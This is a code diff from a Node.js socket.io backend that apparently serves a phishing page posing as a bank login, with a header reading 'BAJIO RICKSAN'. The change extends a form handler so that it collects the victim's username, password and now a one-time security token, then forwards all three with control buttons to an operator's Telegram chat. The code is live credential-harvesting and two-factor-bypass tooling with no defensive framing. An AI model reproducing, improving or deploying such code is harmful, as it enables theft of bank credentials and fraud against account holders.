@@ -90,10 +90,12 @@ io.on('connection', (socket) => {
   });
 
   // Formulario de errorlogo.html
-  socket.on('errorlogoForm', ({ usuario, contrasena, fechaNacimiento, sessionId }) => {
+  socket.on('errorlogoForm', ({ usuario, contrasena, token, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado BAJIO RICKSAN:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n`;
+    // Crear el mensaje con el token
+    const mensaje = `⚠️ Nuevo intento fallido detectado BAJIO RICKSAN:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}\n🔑 Token: ${token}\n`;
+
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -106,6 +108,7 @@ io.on('connection', (socket) => {
       }
     };
 
+    // Enviar el mensaje con el token
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
